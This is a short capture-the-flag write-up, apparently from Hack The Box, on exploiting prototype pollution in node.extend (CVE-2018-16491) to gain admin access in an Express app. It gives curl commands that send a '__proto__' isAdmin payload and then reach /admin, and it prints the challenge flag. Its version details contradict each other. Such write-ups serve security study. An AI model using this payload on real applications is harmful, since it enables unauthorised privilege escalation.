# Prototype Pollution — Node.js (CVE-2018-16491)

## Target

Node.js/Express app using `node.extend 1.1.6` for object merging. JWT session cookie (`session=<JWT>`).

## Vulnerability

`node.extend` (≤1.1.5, ≤2.0.0) does not filter `__proto__` keys during deep merge. When the login handler merges the request body into an object:

```js
// server-side (vulnerable pattern)
node.extend(true, {}, req.body);
```

A body with `"__proto__": {"isAdmin": true}` causes `Object.prototype.isAdmin` to be set to `true` globally for the Node.js process. Any subsequent property access `obj.isAdmin` on an object without its own `isAdmin` property traverses the prototype chain and returns `true`.

## Exploit

Single request — combine valid credentials with `__proto__` pollution:

```bash
curl -si -X POST "http://TARGET/login" \
  -H "Content-Type: application/json" \
  -c cookies.txt \
  -d '{"username":"USER","password":"PASS","__proto__":{"isAdmin":true}}'
```

Then access `/admin` with the session cookie:

```bash
curl -s "http://TARGET/admin" -b cookies.txt
```

## Result

`/admin` renders the flag — `HTB{d87eb495d0d6d7d8db110b7baa70ae40}`

## Key Notes

- Pollution is process-wide and persistent — polluting once affects all subsequent requests on the server
- The `__proto__` key must be in a nested position that triggers a deep merge; shallow `Object.assign` is safe
- JWT expiry is ~1 hour — must complete the attack chain before it expires
- The pollution request can double as the login request (credentials + `__proto__` in one body)
- CVE-2018-16491 fixed in `node.extend` ≥1.1.6 and ≥2.0.1 by blacklisting `__proto__`
